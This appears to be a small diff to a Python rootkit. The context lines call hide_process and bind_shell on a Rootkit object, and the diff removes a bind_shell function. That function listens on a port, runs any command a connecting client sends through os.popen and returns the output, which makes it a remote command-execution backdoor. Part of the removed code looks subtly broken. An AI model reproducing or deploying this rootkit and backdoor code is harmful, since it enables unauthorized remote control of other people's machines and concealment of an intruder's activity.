@@ -62,36 +62,7 @@ if __name__ == '__main__':
     rt = Rootkit()
     rt.hide_process()
     rt.bind_shell(sys.argv[1], int(sys.argv[2]))
-            
 
 
 
-
-def bind_shell(self, host=None, port=None):
-
-    #Check if the host is empty - i so return 0
-    if host is None:
-        return 0;
-
-    if port is None:
-        port = int(44134)
-
-    sleep(5)
-
-    try : 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.bind((host,port))
-        sock.listen(100)
-        while True:
-            client, address = sock.accept()
-            while True:
-                self.shell_text(client, host)
-                command = client.recv(1024).encode("UTF-8")
-                result  = os.popen(command).read() 
-                client.send(result)
-
-    except Exception as error:
-            print "[-] Failed to create socket: {0}".format(str(error))
-
-            
-    
+   
